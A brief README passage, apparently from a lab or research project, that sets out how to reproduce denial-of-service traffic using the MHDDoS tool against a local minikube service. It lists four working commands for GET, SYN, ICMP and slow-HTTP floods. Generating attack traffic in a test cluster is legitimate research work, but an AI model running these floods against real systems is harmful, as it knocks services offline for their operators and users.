For some of the attacks, you need a proxy file, that in this case is empty, for more detailed information consult the MHDDOS [Documentation](https://github.com/MatrixTM/MHDDoS)



Before replicating the attacks, clone the MHDDOS Repository and enter inside it.



These were the commands used for Generate the attacks



```bash
sudo python3 start.py GET $(minikube ip):32677 1 300 http.txt 0 3800 # Get Flood
sudo python3 start.py SYN $(minikube ip):32677 3000 3800 # SYN Flood
sudo python3 start.py ICMP $(minikube ip):32677 30 3800 # Classic DDOS
sudo python3 start.py SLOW $(minikube ip):32677 1 30 http.txt 0 3800 # Slow DDOS
```
